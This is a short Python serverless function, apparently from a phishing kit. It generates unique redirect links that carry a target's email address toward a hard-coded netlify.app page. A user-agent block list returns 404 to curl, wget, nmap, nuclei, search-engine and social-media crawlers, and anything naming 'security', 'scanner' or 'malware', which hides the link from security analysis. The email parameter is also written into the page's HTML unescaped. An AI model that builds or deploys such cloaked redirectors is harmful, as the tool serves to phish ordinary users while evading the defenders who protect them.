from http import HTTPStatus
import uuid
import json
from urllib.parse import urlencode

TARGET_URL = "https://candid-lebkuchen-7ff898.netlify.app/?email="

BLOCKED_UA_KEYWORDS = [
    "bot", "crawler", "spider", "curl", "wget", "python", "requests", "scrapy",
    "selenium", "phantomjs", "headless", "zgrab", "nmap", "nuclei", "httpx",
    "go-http", "facebookexternalhit", "twitterbot", "googlebot", "bingbot",
    "slurp", "duckduckbot", "baiduspider", "yandex", "semrush", "ahrefs",
    "mj12bot", "virus", "scanner", "security", "malware"
]

def is_bot(user_agent):
    if not user_agent:
        return True
    ua = user_agent.lower()
    return any(keyword in ua for keyword in BLOCKED_UA_KEYWORDS)

def handler(event, context):
    headers = event.get('headers', {})
    user_agent = headers.get('user-agent', '')

    if is_bot(user_agent):
        return {"statusCode": 404, "body": "Not found"}

    query_params = event.get('queryStringParameters') or {}
    email = (query_params.get('email') or '').strip()

    unique_id = uuid.uuid4().hex[:12]
    base_url = f"https://{event['headers']['host']}/r/{unique_id}"

    if email:
        base_url += f"?email={email}"

    html = f"""
<!DOCTYPE html>
<html>
<head><title>Link Generator</title></head>
<body style="font-family:Arial; text-align:center; margin-top:50px;">
    <h2>Your Unique Redirect Link</h2>
    <p><strong>{base_url}</strong></p>
    <p>Share this link. It will grab the email, generate a new click ID every time it's used, and redirect.</p>
    <a href="/generate">Generate Another Link</a>
</body>
</html>
"""

    return {
        "statusCode": 200,
        "headers": {"Content-Type": "text/html"},
        "body": html
    }
